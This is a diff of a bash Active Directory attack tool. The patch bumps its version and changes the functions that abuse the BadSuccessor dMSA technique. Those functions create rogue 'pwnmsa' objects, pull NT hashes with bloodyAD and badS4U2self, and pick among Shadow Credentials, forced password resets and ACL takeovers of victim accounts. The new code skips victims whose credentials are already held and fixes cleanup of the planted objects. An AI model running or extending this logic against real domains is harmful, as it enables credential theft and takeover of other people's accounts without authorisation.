@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.48.0"
+readonly VERSION="1.48.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -3615,7 +3615,12 @@ _abuse_badsuccessor() {
 # into the returned hash). Callers: `_bs_create_pull ...; nt="$BS_NT"`.
 _bs_create_pull() {
     local -n _auth="$1"; local tdn="$2" ou="$3" cuser="$4" cccache="$5"
-    local dmsa="pwnmsa$RANDOM" dn="CN=${dmsa},${ou}" out nt=""
+    # NOTE: dn MUST be built in a separate statement — in a single `local a=.. b=$a`
+    # bash expands every value (with the OLD/empty $dmsa) BEFORE assigning, so dn would
+    # become "CN=,${ou}" and the cleanup `remove object` would miss the real dMSA,
+    # leaving orphaned pwnmsa* objects in the OU.
+    local dmsa="pwnmsa$RANDOM" out nt=""
+    local dn="CN=${dmsa},${ou}"
     BS_NT=""
 
     # 1) PATCHED-DC path (default, no --prepatch): does create + Superseded* writes +
@@ -3665,6 +3670,9 @@ _bs_create_pull() {
 _badsuccessor_mark_and_pull() {
     local victim="$1"
     [[ "$DO_ABUSE" == "1" ]] || return 1
+    # Already own the victim (this same victim is reachable via BOTH the bsmark act
+    # AND the GenericAll/full → _abuse_user_smart path) → don't mint a second dMSA.
+    _have_creds_for "$victim" && { info "  BadSuccessor-mark '${victim}' → skipped: already hold its credentials"; return 0; }
     [[ -n "$BADSUCCESSOR_FAC_USER" && -f "$BADSUCCESSOR_FAC_CC" ]] || return 1
     have bloodyAD && have badS4U2self || return 1
     [[ "${victim,,}" == "${BADSUCCESSOR_FAC_USER,,}" || "${victim,,}" == "${USER,,}" ]] && return 1
@@ -3806,6 +3814,9 @@ _abuse_acl_takeover() {
 # ForceChangePassword), and only if those fail, a WriteOwner/WriteDACL takeover.
 _abuse_user_smart() {
     local target="$1"
+    # Already own this principal → don't re-abuse it (and never reset the password of
+    # a user whose hash we already hold). Keeps "Full control" a clean single skip.
+    _have_creds_for "$target" && { info "  Full control over '$target' → skipped: already hold its credentials"; return 0; }
     # If a dMSA factory is registered, BadSuccessor-mark is the most surgical option
     # (recovers the hash, no reset) — try it before Shadow Creds / password reset.
     _badsuccessor_mark_and_pull "$target" && return 0
